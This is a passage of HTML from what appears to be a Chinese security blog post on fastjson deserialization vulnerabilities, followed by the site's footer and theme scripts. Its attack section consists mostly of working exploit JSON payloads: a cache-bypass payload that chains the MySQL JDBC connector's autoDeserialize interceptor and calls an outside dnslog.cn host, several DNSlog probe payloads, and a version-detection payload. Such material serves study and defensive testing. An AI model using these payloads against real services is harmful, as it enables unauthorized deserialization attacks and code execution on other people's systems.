class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓存绕过</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;fw1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;fw2&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,  </span><br><span class="line">        <span class="attr">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,  </span><br><span class="line">        <span class="attr">&quot;portToConnectTo&quot;</span>:<span class="number">3306</span>,  </span><br><span class="line">        <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;user&quot;</span>:<span class="string">&quot;yso_URLDNS_http://nvr7j2.dnslog.cn&quot;</span>,    </span><br><span class="line">            <span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,    </span><br><span class="line">            <span class="attr">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>,    </span><br><span class="line">            <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;,  </span><br><span class="line">        <span class="attr">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;dbname&quot;</span>,  </span><br><span class="line">        <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="DNSlog-payload"><a href="#DNSlog-payload" class="headerlink" title="DNSlog payload"></a>DNSlog payload</h2><p>贴几条</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;http://127.0.0.1&quot;</span>&#125;:<span class="string">&quot;x&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 精确探测版本</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br><span class="line">[&#123;<span class="attr">&quot;a&quot;</span>:<span class="string">&quot;a\x]</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QGyb1Zv4F9IvmjKfiCD_4Q">https://mp.weixin.qq.com/s/QGyb1Zv4F9IvmjKfiCD_4Q</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#2-fastjson-1225">https://su18.org/post/fastjson/#2-fastjson-1225</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/">https://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/</a></p>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>fastjson先这样吧，前前后后花了好几天，真菜，写的什么玩意诶</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/2021/10/20/fastjson_3/">fastjson-3<span class="note">较早</span></a><div class="line"></div><div class="line"></div><a id="more" href="/archives">检索全部文章</a></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<p>本站由 <a href="http://example.com/">@John Doe</a> 创建，使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.5.1" title="v1.5.1">Stellar</a> 作为主题。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.5.1';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
